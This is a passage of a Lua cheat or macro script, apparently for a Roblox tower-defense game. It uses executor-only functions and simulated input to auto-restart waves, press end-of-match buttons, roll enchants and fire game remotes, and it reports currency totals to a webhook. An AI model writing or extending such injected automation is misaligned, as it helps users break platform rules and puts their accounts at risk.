                            print("[Wave Restart] Wave " .. currentWave .. " reached, restarting match...")
                            
                            if getgenv().SeamlessFixEnabled and getgenv()._SeamlessEndgameCount then
                                getgenv()._SeamlessEndgameCount = getgenv()._SeamlessEndgameCount + 1
                                local maxRounds = getgenv().SeamlessRounds or 4
                                print("[Wave Restart] Seamless counter: " .. getgenv()._SeamlessEndgameCount .. "/" .. maxRounds)
                            end
                            
                            if getgenv().WebhookEnabled and not getgenv().WebhookProcessing then
                                print("[Wave Restart] Sending webhook before restart...")
                                task.spawn(function()
                                    pcall(function()
                                        getgenv()._ForceWebhookSend = true
                                        getgenv()._WebhookSeamlessRestart = true
                                        
                                        local matchTime = "00:00:00"
                                        pcall(function()
                                            local elapsed = RS:FindFirstChild("ElapsedTime")
                                            if elapsed and elapsed.Value then
                                                local seconds = math.floor(elapsed.Value)
                                                local hours = math.floor(seconds / 3600)
                                                local minutes = math.floor((seconds % 3600) / 60)
                                                local secs = seconds % 60
                                                matchTime = string.format("%02d:%02d:%02d", hours, minutes, secs)
                                            end
                                        end)
                                        
                                        print("[Wave Restart] Match time: " .. matchTime .. ", Wave: " .. currentWave)
                                        
                                        if getgenv()._SendWebhookManual then
                                            getgenv()._SendWebhookManual()
                                        end
                                        
                                        task.wait(2)
                                        
                                        local clientData = getClientData()
                                        if clientData then
                                            getgenv()._WebhookInitialData.Jewels = clientData.Jewels or 0
                                            getgenv()._WebhookInitialData.Gold = clientData.Gold or 0
                                            getgenv()._WebhookInitialData.Emeralds = clientData.Emeralds or 0
                                            getgenv()._WebhookInitialData.Rerolls = clientData.Rerolls or 0
                                            getgenv()._WebhookInitialData.CandyBasket = clientData.CandyBasket or 0
                                            getgenv()._WebhookInitialData.HeroTokens = clientData.HeroTokens or 0
                                            getgenv()._WebhookInitialData.EXP = clientData.EXP or 0
                                            getgenv()._WebhookInitialData.HalloweenCookies = clientData.HalloweenCookies or 0
                                            getgenv()._WebhookInitialData.MagicCoins = clientData.MagicCoins or 0
                                            getgenv()._WebhookInitialData.EmberTokens = clientData.EmberTokens or 0
                                            getgenv()._WebhookInitialData.BlazeTokens = clientData.BlazeTokens or 0
                                            getgenv()._WebhookInitialData.HorseTokens = clientData.HorseTokens or 0
                                            getgenv()._WebhookInitialData.DevilDogTokens = clientData.DevilDogTokens or 0
                                            getgenv()._WebhookInitialData.TitanRushTokens = clientData.TitanRushTokens or 0
                                            getgenv()._WebhookInitialData.SoccerTokens = clientData.SoccerTokens or 0
                                            getgenv()._WebhookInitialData.SlimeCoins = clientData.SlimeCoins or 0
                                            
                                            getgenv()._WebhookInitialData.ItemData = {}
                                            if clientData.ItemData then
                                                for itemName, itemInfo in pairs(clientData.ItemData) do
                                                    if itemInfo.Amount then
                                                        getgenv()._WebhookInitialData.ItemData[itemName] = itemInfo.Amount
                                                    end
                                                end
                                            end

                                        end
                                    end)
                                end)
                                
                                task.wait(3)
                            end
                            
                            local remotes = RS:FindFirstChild("Remotes")
                            local restartRemote = remotes and remotes:FindFirstChild("RestartMatch")
                            
                            if restartRemote then
                                local success = ErrorHandler:wrapAsync(function()
                                    restartRemote:FireServer()
                                end, "Wave restart")
                                
                                if success then
                                    print("[Wave Restart] ✅ Restart signal sent")
                                else
                                    ErrorHandler:notify(Window, "Wave Restart Error", "Failed to send restart signal")
                                end
                                
                                Window:Notify({
                                    Title = "Wave Restart",
                                    Description = "Restarting at wave " .. currentWave,
                                    Lifetime = 3
                                })
                                
                                getgenv()._ForceWebhookSend = false
                                getgenv()._WebhookSeamlessRestart = false
                                
                                task.spawn(function()
                                    task.wait(5)
                                    if getgenv()._RefreshWebhookInitialData then
                                        getgenv()._RefreshWebhookInitialData()
                                    end
                                end)
                                
                                task.spawn(function()
                                    print("[Wave Restart] Waiting for game to restart...")
                                    local restartWaitStart = tick()
                                    local maxRestartWait = 30
                                    local gameRestarted = false
                                    
                                    while (tick() - restartWaitStart) < maxRestartWait do
                                        local gameStarted = true
                                        pcall(function()
                                            local gs = RS:FindFirstChild("GameStarted")
                                            if gs and gs.Value ~= nil then
                                                gameStarted = gs.Value
                                            end
                                        end)
                                        
                                        if not gameStarted then
                                            print("[Wave Restart] Game ended, waiting for new game to start...")
                                            break
                                        end
                                        
                                        task.wait(0.5)
                                    end
                                    
                                    restartWaitStart = tick()
                                    while (tick() - restartWaitStart) < maxRestartWait do
                                        local gameStarted = false
                                        pcall(function()
                                            local gs = RS:FindFirstChild("GameStarted")
                                            if gs and gs.Value ~= nil then
                                                gameStarted = gs.Value
                                            end
                                        end)
                                        
                                        if gameStarted then
                                            gameRestarted = true
                                            print("[Wave Restart] ✅ New game started, restarting macro...")
                                            
                                            if getgenv().MacroPlaybackActive then
                                                print("[Wave Restart] Stopping current macro playback (was still running)...")
                                                getgenv().MacroPlaybackActive = false
                                                task.wait(1)
                                            end
                                            
                                            getgenv().MacroStatusText = "Idle"
                                            getgenv().MacroCurrentStep = 0
                                            getgenv().MacroActionText = ""
                                            getgenv().MacroUnitText = ""
                                            getgenv().MacroWaitingText = ""
                                            getgenv().MacroGameState.gameEnded = false
                                            getgenv().MacroGameState.hasEndGameUI = false
                                            getgenv().MacroGameState.lastGameEndedState = false
                                            getgenv()._MacroSeamlessRestart = true
                                            getgenv()._MacroProgressDetected = false
                                            getgenv().UpdateMacroStatus()
                                            
                                            task.wait(3)
                                            
                                            local waitCount = 0
                                            while getgenv().MacroPlaybackActive and waitCount < 20 do
                                                task.wait(0.1)
                                                waitCount = waitCount + 1
                                            end
                                            
                                            if getgenv().MacroPlaybackActive then
                                                warn("[Wave Restart] Force stopping macro playback...")
                                                getgenv().MacroPlaybackActive = false
                                                task.wait(1)
                                            end
                                            
                                            if getgenv().MacroPlayEnabled and not getgenv()._MacroWaitingForRestart then
                                                print("[Wave Restart] Restarting macro playback from beginning...")
                                                task.wait(1)
                                                getgenv()._MacroWaitingForRestart = false
                                                playMacroV2()
                                            else
                                                if getgenv()._MacroWaitingForRestart then
                                                    warn("[Wave Restart] Macro is waiting for restart, skipping")
                                                else
                                                    warn("[Wave Restart] Macro play is disabled, not restarting")
                                                end
                                            end
                                            
                                            task.wait(2)
                                            getgenv()._MacroSeamlessRestart = false
                                            getgenv()._MacroWaitingForRestart = false
                                            getgenv()._MacroProgressDetected = false
                                            
                                            break
                                        end
                                        
                                        task.wait(0.5)
                                    end
                                    
                                    if not gameRestarted then
                                        warn("[Wave Restart] ⚠️ Timeout waiting for game restart, macro may not restart automatically")
                                    end
                                end)
                            else
                                print("[Wave Restart] ❌ RestartMatch remote not found")
                            end
                        end
                    end
                end)
            end
        end
    end)
end

end

if not getgenv()._TwoXHistory then
    getgenv()._TwoXHistory = { }
    getgenv().TwoXActive = false
end

do 
    local HttpService = game:GetService("HttpService")
    getgenv()._TwoXHistory = getgenv()._TwoXHistory or {}
    getgenv().TwoXActive = getgenv().TwoXActive or false

    getgenv()._SaveTwoXState = function()
        if not writefile then return end
        local ok, encoded = pcall(HttpService.JSONEncode, HttpService, {
            Active = getgenv().TwoXActive,
            History = getgenv()._TwoXHistory,
            ResetWave = getgenv().TwoXResetWave
        })
        if ok then pcall(writefile, "Maclib_twox_state.json", encoded) end
    end

    getgenv()._LoadTwoXState = function()
        if not readfile or not isfile or not isfile("Maclib_twox_state.json") then return end
        local ok, data = pcall(function()
            return HttpService:JSONDecode(readfile("Maclib_twox_state.json"))
        end)
        if ok and type(data) == "table" then
            getgenv().TwoXActive = data.Active or false
            getgenv()._TwoXHistory = data.History or getgenv()._TwoXHistory
            if data.ResetWave then
                local rw = tonumber(data.ResetWave)
                if rw then getgenv().TwoXResetWave = rw end
            end
        end
    end

    getgenv()._PushRoundGain = function(gain)
        local hist = getgenv()._TwoXHistory
        hist[#hist+1] = gain
        if #hist > 5 then table.remove(hist, 1) end
    end

    local function avg(list)
        local total = 0
        for i=1,#list do total += list[i] end
        if #list == 0 then return 0 end
        return total / #list
    end

    getgenv()._DetectTwoX = function()
        local hist = getgenv()._TwoXHistory
        local len = #hist
        if len < 5 then return end
        local last = hist[len]
        local prev4 = {hist[len-4], hist[len-3], hist[len-2], hist[len-1]}
        local baseline = avg(prev4)
        if baseline <= 0 then return end
        local ratio = last / baseline
        if ratio >= 1.8 then
            if not getgenv().TwoXActive then
                getgenv().TwoXActive = true
                getgenv()._SaveTwoXState()
                Window:Notify({ Title = "2x Tracker", Description = "Detected 2x ACTIVE (ratio " .. string.format("%.2f", ratio) .. ")", Lifetime = 4 })
            end
        elseif ratio <= 1.3 and getgenv().TwoXActive then
            getgenv().TwoXActive = false
            getgenv()._SaveTwoXState()
            Window:Notify({ Title = "2x Tracker", Description = "2x ended (ratio " .. string.format("%.2f", ratio) .. ")", Lifetime = 4 })
        end
    end

    getgenv()._LoadTwoXState()
end

task.spawn(function()
    while true do
        task.wait(5)
        if not getgenv().TwoXTrackerEnabled then continue end
        pcall(function()
            local data = getgenv().GetClientData and getgenv().GetClientData()
            if data then
                local currency = 0
                if data.CandyBasket then currency = data.CandyBasket end
                if data.HalloweenCookies and data.HalloweenCookies > currency then currency = data.HalloweenCookies end
                getgenv()._LastCurrencySnapshot = getgenv()._LastCurrencySnapshot or currency
                local delta = currency - getgenv()._LastCurrencySnapshot
                if delta > 0 then
                    getgenv()._PushRoundGain(delta)
                    getgenv()._DetectTwoX()
                    getgenv()._SaveTwoXState()
                end
                getgenv()._LastCurrencySnapshot = currency
            end
        end)
    end
end)


task.spawn(function()
    task.wait(2)
    
    pcall(function()
        
        local toggleCount = 0
        for flag, value in pairs(getgenv().Config.toggles) do
            local element = MacLib.Flags[flag]
            if element and element.UpdateState then
                pcall(function()
                    element:UpdateState(value)
                    toggleCount = toggleCount + 1
                end)
            end
        end
        
        local inputCount = 0
        for flag, value in pairs(getgenv().Config.inputs) do
            local element = MacLib.Flags[flag]
            if element and element.UpdateText then
                pcall(function()
                    if value ~= nil and value ~= "" then
                        element:UpdateText(tostring(value))
                        inputCount = inputCount + 1
                    end
                end)
            end
        end
        
        local dropdownCount = 0
        for flag, value in pairs(getgenv().Config.dropdowns) do
            local element = MacLib.Flags[flag]
            if element and element.UpdateSelection then
                pcall(function()
                    if value then
                        element:UpdateSelection(value)
                        dropdownCount = dropdownCount + 1
                    end
                end)
            end
        end
        
        
        if getgenv().CurrentMacro and MacLib.Flags["MacroSelect"] then
            pcall(function()
                MacLib.Flags["MacroSelect"]:UpdateSelection(getgenv().CurrentMacro)
            end)
        end
        
        if getgenv().AutoJoinConfig then
            if getgenv().AutoJoinConfig.mode and MacLib.Flags["AutoJoinMode"] then
                pcall(function()
                    MacLib.Flags["AutoJoinMode"]:UpdateSelection(getgenv().AutoJoinConfig.mode)
                end)
            end
            
            if getgenv().AutoJoinConfig.map and MacLib.Flags["AutoJoinMap"] then
                pcall(function()
                    MacLib.Flags["AutoJoinMap"]:UpdateSelection(getgenv().AutoJoinConfig.map)
                end)
            end
            
            if getgenv().AutoJoinConfig.difficulty and MacLib.Flags["AutoJoinDifficulty"] then
                pcall(function()
                    MacLib.Flags["AutoJoinDifficulty"]:UpdateSelection(getgenv().AutoJoinConfig.difficulty)
                end)
            end
        end
        
        if getgenv().BulmaWishType and MacLib.Flags["BulmaWishType"] then
            pcall(function()
                MacLib.Flags["BulmaWishType"]:UpdateSelection(getgenv().BulmaWishType)
            end)
        end
        
        if getgenv().SkeletonKnightTargetUnit and MacLib.Flags["SkeletonKnightTargetUnit"] then
            pcall(function()
                MacLib.Flags["SkeletonKnightTargetUnit"]:UpdateSelection(getgenv().SkeletonKnightTargetUnit)
            end)
        end
        
        if getgenv().AlucardHypnosisTargetUnit and MacLib.Flags["AlucardHypnosisTargetUnit"] then
            pcall(function()
                MacLib.Flags["AlucardHypnosisTargetUnit"]:UpdateSelection(getgenv().AlucardHypnosisTargetUnit)
            end)
        end
        
    end)
end)


getgenv()._GuiService = game:GetService("GuiService")

getgenv()._isTeleporting = false

task.spawn(function()
    local lastEndGameUIInstance = nil
    local hasProcessedCurrentUI = false
    local endGameUIDetectedTime = 0
    local endGameUIWasPresent = false
    local lastActionTime = 0
    local ACTION_TIMEOUT = 45
    local newGameDetected = false
    local lastEndGameUIState = false
    
    while true do
        task.wait(0.2)
        
        local success, errorMsg = pcall(function()
            if not LocalPlayer or not LocalPlayer.PlayerGui then return end
            
            local endGameUI = LocalPlayer.PlayerGui:FindFirstChild("EndGameUI")
            local currentEndGameUIState = endGameUI and endGameUI.Enabled or false
            
            if lastEndGameUIState and not currentEndGameUIState then
                newGameDetected = true
                hasProcessedCurrentUI = false
                lastEndGameUIInstance = nil
                endGameUIWasPresent = false
                getgenv()._isTeleporting = false
                
                getgenv().MacroGameState.hasStartButton = false
                getgenv().MacroGameState.currentWave = 0
                getgenv().MacroGameState.gameEnded = false
                getgenv().MacroGameState.hasEndGameUI = false
                getgenv().MacroCurrentStep = 1
                getgenv().MacroActionText = ""
                getgenv().MacroUnitText = ""
                getgenv().MacroWaitingText = ""
                getgenv().MacroStatusText = "New Game Started"
                getgenv().MacroPlaybackActive = false
                getgenv()._MacroProgressDetected = false
                getgenv()._MacroWaitingForRestart = false
                
                getgenv().SmartCardPicked = {}
                getgenv().SmartCardLastPromptId = nil
                getgenv().SlowerCardPicked = {}
                getgenv().SlowerCardLastPromptId = nil
                
                if getgenv().UpdateMacroStatus then
                    getgenv().UpdateMacroStatus()
                end
                
                task.spawn(function()
                    task.wait(2)
                    
                    if getgenv().MacroPlaybackActive then
                        getgenv().MacroPlaybackActive = false
                        task.wait(1)
                    end
                    
                    local gameStarted = false
                    pcall(function()
                        local gs = RS:FindFirstChild("GameStarted")
                        if gs and gs.Value ~= nil then
                            gameStarted = gs.Value
                        end
                    end)
                    
                    if not gameStarted then
                        local waitStart = tick()
                        while (tick() - waitStart) < 10 do
                            pcall(function()
                                local gs = RS:FindFirstChild("GameStarted")
                                if gs and gs.Value ~= nil then
                                    gameStarted = gs.Value
                                end
                            end)
                            if gameStarted then break end
                            task.wait(0.5)
                        end
                    end
                    
                    if gameStarted and getgenv().MacroPlayEnabled then
                        print("[Macro] ✅ New game detected, restarting macro from step 1...")
                        getgenv()._MacroSeamlessRestart = true
                        getgenv()._MacroProgressDetected = false
                        getgenv().MacroPlaybackActive = false
                        getgenv()._MacroWaitingForRestart = false
                        task.wait(1)
                        playMacroV2()
                    end
                end)
            end
            
            lastEndGameUIState = currentEndGameUIState
            
            if endGameUI then
                endGameUIWasPresent = true
            end
            
            if not endGameUI or not endGameUI.Enabled then 
                return 
            end
            
            local bg = endGameUI:FindFirstChild("BG")
            if not bg then return end
            
            local buttons = bg:FindFirstChild("Buttons")
            if not buttons then return end
            
            if lastEndGameUIInstance and endGameUI ~= lastEndGameUIInstance then
                hasProcessedCurrentUI = false
                lastEndGameUIInstance = endGameUI
                endGameUIDetectedTime = tick()
                newGameDetected = false
            end
            
            if not lastEndGameUIInstance then
                lastEndGameUIInstance = endGameUI
                endGameUIDetectedTime = tick()
            end
            
            if hasProcessedCurrentUI then
                return
            end
            
            local nextButton = buttons:FindFirstChild("Next")
            local retryButton = buttons:FindFirstChild("Retry")
            local leaveButton = buttons:FindFirstChild("Leave")
            
            if not retryButton or not nextButton or not leaveButton then
                for _, button in pairs(buttons:GetChildren()) do
                    if button:IsA("TextButton") or button:IsA("ImageButton") then
                        local textLabel = button:FindFirstChildWhichIsA("TextLabel", true)
                        if textLabel then
                            local text = textLabel.Text:lower()
                            if text:find("retry") and not retryButton then
                                retryButton = button
                            elseif text:find("next") and not nextButton then
                                nextButton = button
                            elseif text:find("leave") and not leaveButton then
                                leaveButton = button
                            end
                        end
                    end
                end
            end
            
            if getgenv().DebugMode then
                print(string.format("[Auto Actions] Buttons detected - Next: %s | Retry: %s | Leave: %s", 
                    tostring(nextButton and nextButton.Visible), 
                    tostring(retryButton and retryButton.Visible), 
                    tostring(leaveButton and leaveButton.Visible)))
                print(string.format("[Auto Actions] Toggles - AutoNext: %s | AutoRetry: %s | AutoLeave: %s | AutoSmart: %s",
                    tostring(getgenv().AutoNextEnabled),
                    tostring(getgenv().AutoFastRetryEnabled),
                    tostring(getgenv().AutoLeaveEnabled),
                    tostring(getgenv().AutoSmartEnabled)))
            end
            
            local buttonToPress, actionName = nil, ""
            
            local isFinalExpedition = false
            pcall(function()
                local gamemode = RS:FindFirstChild("Gamemode")
                if gamemode and gamemode.Value == "FinalExpedition" then
                    isFinalExpedition = true
                end
            end)
            
            if isFinalExpedition then
                
                local promptWait = 0
                while promptWait < 10 do
                    local promptExists = false
                    pcall(function()
                        local promptGui = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
                        if promptGui and promptGui.Enabled then
                            promptExists = true
                        end
                    end)
                    
                    if not promptExists then
                        break
                    end
                    
                    task.wait(0.5)
                    promptWait = promptWait + 0.5
                end
                
                task.wait(5)
                
                local waitTime = 5
                local maxWaitTime = 15
                
                while waitTime < maxWaitTime do
                    local foundNext = false
                    pcall(function()
                        if buttons then
                            nextButton = buttons:FindFirstChild("Next")
                            if not nextButton then
                                for _, button in pairs(buttons:GetChildren()) do
                                    if button:IsA("TextButton") or button:IsA("ImageButton") then
                                        local textLabel = button:FindFirstChildWhichIsA("TextLabel", true)
                                        if textLabel and textLabel.Text:lower():find("next") then
                                            nextButton = button
                                            break
                                        end
                                    end
                                end
                            end
                            
                            if nextButton and nextButton.Visible then
                                foundNext = true
                            end
                        end
                    end)
                    
                    if foundNext then
                        break
                    end
                    
                    task.wait(0.5)
                    waitTime = waitTime + 0.5
                end
                
                if waitTime >= maxWaitTime then
                    print("[Final Expedition] Timeout waiting for Next button after 15s")
                end
            end
            
            if getgenv().AutoSmartEnabled then
                if nextButton and nextButton.Visible then
                    buttonToPress = nextButton
                    actionName = "Next"
                elseif retryButton and retryButton.Visible then
                    buttonToPress = retryButton
                    actionName = "Retry"
                elseif leaveButton and leaveButton.Visible then
                    if isFinalExpedition and nextButton and nextButton.Visible then
                        buttonToPress = nextButton
                        actionName = "Next"
                    else
                        buttonToPress = leaveButton
                        actionName = "Leave"
                    end
                end
            elseif getgenv().AutoNextEnabled and nextButton and nextButton.Visible then
                buttonToPress = nextButton
                actionName = "Next"
            elseif getgenv().AutoFastRetryEnabled and retryButton and retryButton.Visible then
                buttonToPress = retryButton
                actionName = "Retry"
            elseif getgenv().AutoLeaveEnabled and leaveButton and leaveButton.Visible then
                if isFinalExpedition and nextButton and nextButton.Visible then
                    buttonToPress = nextButton
                    actionName = "Next"
                else
                    buttonToPress = leaveButton
                    actionName = "Leave"
                end
            end
            
            if buttonToPress then
                if getgenv()._isTeleporting then
                    return
                end
                
                if getgenv().WebhookEnabled then
                    if not getgenv().WebhookProcessing then
                        print("[Auto " .. actionName .. "] Triggering webhook (async, non-blocking)...")
                        task.spawn(function()
                            pcall(function()
                                if getgenv()._SendMatchWebhook then
                                    getgenv()._SendMatchWebhook()
                                end
                            end)
                        end)
                    end
                end
                
                task.wait(0.1)
                
                hasProcessedCurrentUI = true
                lastActionTime = tick()
                
                local pressSuccess = false
                local clickMethod = "Unknown"
                
                local function tryGuiServiceMethod()
                    getgenv()._ButtonPressActive = true
                    local success = pcall(function()
                        if not buttonToPress or not buttonToPress.Parent then
                            getgenv()._ButtonPressActive = false
                            return
                        end
                        
                        if not buttonToPress:IsDescendantOf(game) then
                            getgenv()._ButtonPressActive = false
                            return
                        end
                        
                        if not buttonToPress:IsDescendantOf(LocalPlayer.PlayerGui) then
                            getgenv()._ButtonPressActive = false
                            return
                        end
                        
                        local GuiService = game:GetService("GuiService")
                        
                        pcall(function()
                            GuiService.SelectedObject = nil
                        end)
                        task.wait(0.1)
                        
                        if not buttonToPress or not buttonToPress.Parent or not buttonToPress:IsDescendantOf(LocalPlayer.PlayerGui) then
                            return
                        end
                        
                        local setSuccess = pcall(function()
                            GuiService.SelectedObject = buttonToPress
                        end)
                        
                        if not setSuccess then
                            return
                        end
                        
                        local lockConnection
                        lockConnection = RunService.Heartbeat:Connect(function()
                            pcall(function()
                                if buttonToPress and buttonToPress.Parent and GuiService.SelectedObject ~= buttonToPress then
                                    GuiService.SelectedObject = buttonToPress
                                end
                            end)
                        end)
                        
                        task.wait(0.3)
                        
                        if GuiService.SelectedObject == buttonToPress then
                            VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                            task.wait(0.05)
                            VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                            task.wait(0.2)
                            
                            if lockConnection then
                                lockConnection:Disconnect()
                            end
                            
                            GuiService.SelectedObject = nil
                            pressSuccess = true
                            clickMethod = "GuiService"
                        else
                            if lockConnection then
                                lockConnection:Disconnect()
                            end
                        end
                    end)
                    getgenv()._ButtonPressActive = false
                    return success and pressSuccess
                end
                
                local function tryMouseClickMethod()
                    local success = pcall(function()
                        if not buttonToPress or not buttonToPress.Parent or not buttonToPress:IsDescendantOf(LocalPlayer.PlayerGui) then
                            return
                        end
                        
                        local absolutePosition = buttonToPress.AbsolutePosition
                        local absoluteSize = buttonToPress.AbsoluteSize
                        local centerX = absolutePosition.X + (absoluteSize.X / 2)
                        local centerY = absolutePosition.Y + (absoluteSize.Y / 2)
                        
                        VIM:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
                        task.wait(0.05)
                        VIM:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)
                        task.wait(0.2)
                        
                        pressSuccess = true
                        clickMethod = "MouseClick"
                    end)
                    return success and pressSuccess
                end
                
                local function tryActivatedMethod()
                    local success = pcall(function()
                        if not buttonToPress or not buttonToPress.Parent or not buttonToPress:IsDescendantOf(LocalPlayer.PlayerGui) then
                            return
                        end
                        
                        getgenv()._SkipRecordingNextCall = true
                        for _, signal in pairs({"MouseButton1Click", "Activated"}) do
                            pcall(function()
                                for _, connection in pairs(getconnections(buttonToPress[signal])) do
                                    connection:Fire()
                                end
                            end)
                        end
                        getgenv()._SkipRecordingNextCall = false
                        
                        task.wait(0.2)
                        pressSuccess = true
                        clickMethod = "Activated"
                    end)
                    return success and pressSuccess
                end
                
                if tryGuiServiceMethod() then
                    print("[Auto " .. actionName .. "] ✅ Button pressed successfully! (Method: " .. clickMethod .. ")")
                    getgenv()._isTeleporting = true
                elseif tryMouseClickMethod() then
                    print("[Auto " .. actionName .. "] ✅ Button pressed successfully! (Method: " .. clickMethod .. ")")
                    getgenv()._isTeleporting = true
                elseif tryActivatedMethod() then
                    print("[Auto " .. actionName .. "] ✅ Button pressed successfully! (Method: " .. clickMethod .. ")")
                    getgenv()._isTeleporting = true
                else
                    warn("[Auto " .. actionName .. "] ❌ All click methods failed!")
                end
            end
        end)
    end
end)

do
    task.spawn(function()
    while true do
        task.wait(1)
        
        if getgenv()._checkIfInLobby() then
            task.wait(2)
            continue
        end
        
        if getgenv().AutoReadyEnabled then
            local success, err = pcall(function()
                local bottomGui = LocalPlayer.PlayerGui:FindFirstChild("Bottom")
                if bottomGui then
                    local frame = bottomGui:FindFirstChild("Frame")
                    if frame then
                        local children = frame:GetChildren()
                        if children[2] then
                            local subChildren = children[2]:GetChildren()
                            if subChildren[6] then
                                local textButton = subChildren[6]:FindFirstChild("TextButton")
                                if textButton then
                                    local textLabel = textButton:FindFirstChild("TextLabel")
                                    if textLabel and textLabel.Text == "Start" then
                                        local remotes = RS:FindFirstChild("Remotes")
                                        local playerReady = remotes and remotes:FindFirstChild("PlayerReady")
                                        if playerReady then
                                            ErrorHandler:wrapAsync(function()
                                                playerReady:FireServer()
                                            end, "Auto ready")
                                            task.wait(2)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end)
            if not success then
                warn("[Auto Ready] Error: " .. tostring(err))
            end
        end
    end
    end)
end

task.spawn(function()
    local lastRollTime = 0
    local ROLL_COOLDOWN = 2
    
    while true do
        task.wait(0.1)
        
        if not getgenv().AutoEnchantEnabled then
            task.wait(0.5)
            continue
        end
        
        if not getgenv().AutoEnchantUnit or getgenv().AutoEnchantUnit == "" or getgenv().AutoEnchantUnit == "No units found" or getgenv().AutoEnchantUnit == "Loading units..." then
            if getgenv().DebugMode then
                print("[AutoEnchant] Waiting for valid unit selection: " .. tostring(getgenv().AutoEnchantUnit))
            end
            task.wait(0.5)
            continue
        end
        
        if not getgenv().AutoEnchantDesiredEnchants or type(getgenv().AutoEnchantDesiredEnchants) ~= "table" then
            if getgenv().DebugMode then
                print("[AutoEnchant] Waiting for desired enchants to be set")
            end
            task.wait(0.5)
            continue
        end
        
        local hasDesiredEnchant = false
        for enchant, selected in pairs(getgenv().AutoEnchantDesiredEnchants) do
            if selected then
                hasDesiredEnchant = true
                break
            end
        end
        
        if not hasDesiredEnchant then
            if getgenv().DebugMode then
                print("[AutoEnchant] No desired enchants selected")
            end
            task.wait(0.5)
            continue
        end
        
        local currentTime = tick()
        if (currentTime - lastRollTime) < ROLL_COOLDOWN then
            continue
        end
        
        if getgenv().DebugMode then
            print("[AutoEnchant] Starting enchant attempt for: " .. getgenv().AutoEnchantUnit)
        end
        
        local success, err = pcall(function()
            local unit = getgenv()._findUnitByDisplay(getgenv().AutoEnchantUnit)
            if not unit then
                warn("[AutoEnchant] Selected unit not found")
                return
            end
            
            ClientDataCache.module = nil
            ClientDataCache.lastUpdate = 0
            task.wait(0.3)
            
            local currentEnchant = nil
            for i = 1, 3 do
                currentEnchant = getgenv()._getUnitEnchant(unit.unitID)
                if currentEnchant and currentEnchant ~= "None" then
                    break
                end
                task.wait(0.2)
            end
            
            if not currentEnchant then
                currentEnchant = "None"
            end
            
            if getgenv().AutoEnchantDesiredEnchants[currentEnchant] then
                debugPrint("[AutoEnchant] Unit already has desired enchant: " .. currentEnchant)
                return
            end
            
            local remotes = RS:FindFirstChild("Remotes")
            if not remotes then
                warn("[AutoEnchant] Remotes not found")
                return
            end
            
            local enchants = remotes:FindFirstChild("Enchants")
            if not enchants then
                warn("[AutoEnchant] Enchants folder not found")
                return
            end
            
            local rollEnchant = enchants:FindFirstChild("RollEnchant")
            if not rollEnchant then
                warn("[AutoEnchant] RollEnchant remote not found")
                return
            end
            
            print("[AutoEnchant] Attempting to roll enchant for " .. unit.unitName .. " (ID: " .. unit.unitID .. ") using " .. getgenv().AutoEnchantMaterial)
            print("[AutoEnchant] Current enchant: " .. tostring(currentEnchant))
            
            lastRollTime = tick()
            
            local rollSuccess, rollResult = pcall(function()
                return rollEnchant:InvokeServer(unit.unitID, getgenv().AutoEnchantMaterial, currentEnchant)
            end)
            
            if rollSuccess and rollResult then
                debugPrint("[AutoEnchant] Rolled enchant for " .. unit.unitName .. " using " .. getgenv().AutoEnchantMaterial)
                ClientDataCache.module = nil
                ClientDataCache.lastUpdate = 0
                task.wait(1)
                
                local newEnchant = nil
                for i = 1, 3 do
                    newEnchant = getgenv()._getUnitEnchant(unit.unitID)
                    if newEnchant and newEnchant ~= currentEnchant then
                        break
                    end
                    task.wait(0.3)
                end
                
                if newEnchant and getgenv().AutoEnchantDesiredEnchants[newEnchant] then
                    Window:Notify({
                        Title = "Auto Enchant",
                        Description = "Got " .. newEnchant .. " on " .. unit.unitName .. "!",
                        Lifetime = 5,
                        Style = "Confirm"
                    })
                    getgenv().AutoEnchantEnabled = false
                end
                task.wait(1)
            else
                local errorMsg = tostring(rollResult)
                if errorMsg:find("mismatch") then
                    warn("[AutoEnchant] Enchant mismatch detected, refreshing cache and retrying...")
                    ClientDataCache.module = nil
                    ClientDataCache.lastUpdate = 0
                    task.wait(2)
                else
                    warn("[AutoEnchant] Failed to roll enchant: " .. errorMsg)
                    task.wait(1)
                end
            end
        end)
        
        if not success then
            warn("[AutoEnchant] Error: " .. tostring(err))
            task.wait(0.5)
        end
    end
end)



getgenv()._AbilityHelpers1 = getgenv()._AbilityHelpers1 or {}

getgenv()._AbilityHelpers1.getCurrentWave = function()
    local ok, res = pcall(function()
        local waveValue = RS:FindFirstChild("Wave")
        if waveValue and waveValue:IsA("IntValue") then
            return waveValue.Value
        end
        return 0
    end)
    
    if ok and res > 0 then
        return res
    end
    
    local ok2, res2 = pcall(function()
        local gui = LocalPlayer.PlayerGui:FindFirstChild("HUD")
        if not gui then return 0 end
        local frame = gui:FindFirstChild("Frame")
        if not frame then return 0 end
        local wave = frame:FindFirstChild("Wave")
        if not wave then return 0 end
        local label = wave:FindFirstChild("TextLabel")
        if not label then return 0 end
        local text = label.Text
        local num = tonumber(text:match("%d+"))
        return num or 0
    end)
    return ok2 and res2 or 0
end

getgenv()._AbilityHelpers1.getCurrentTimeScale = function()
    local ok, res = pcall(function()
        local timeScale = RS:FindFirstChild("TimeScale")
        if timeScale and timeScale:IsA("NumberValue") then
            return timeScale.Value or 1
        end
        return 1
    end)
    return ok and res or 1
end

getgenv()._AbilityHelpers1.getUpgradeLevel = function(tower)
    if not tower then return 0 end
    local ok, res = pcall(function()
        local u = tower:FindFirstChild("Upgrade")
        if u and u:IsA("ValueBase") then return u.Value or 0 end
        return 0
    end)
    return ok and res or 0
end

getgenv()._AbilityHelpers1.fixAbilityName = function(abilityName)
    local fixed = abilityName
    fixed = fixed:gsub("!!+", "!")
    fixed = fixed:gsub("%?%?+", "?")
    return fixed
end

getgenv()._AbilityHelpers1.useAbility = function(tower, abilityName)
    if tower then
        if abilityName == "Who Decided That?" then
            ErrorHandler:wrapAsync(function() 
                RS.Remotes.Ability:InvokeServer(tower, abilityName)
                print("[Soul Ability] Used: " .. abilityName)
            end, "Use ability: " .. abilityName)
        else
            local correctedName = getgenv()._AbilityHelpers1.fixAbilityName(abilityName)
            ErrorHandler:wrapAsync(function() 
                RS.Remotes.Ability:InvokeServer(tower, correctedName) 
            end, "Use ability: " .. correctedName)
        end
    end
end

getgenv()._AbilityHelpers1.getAbilityData = function(towerName, abilityName)
    if abilityName == "Who Decided That?" then
        return {
            cooldown = 999999,
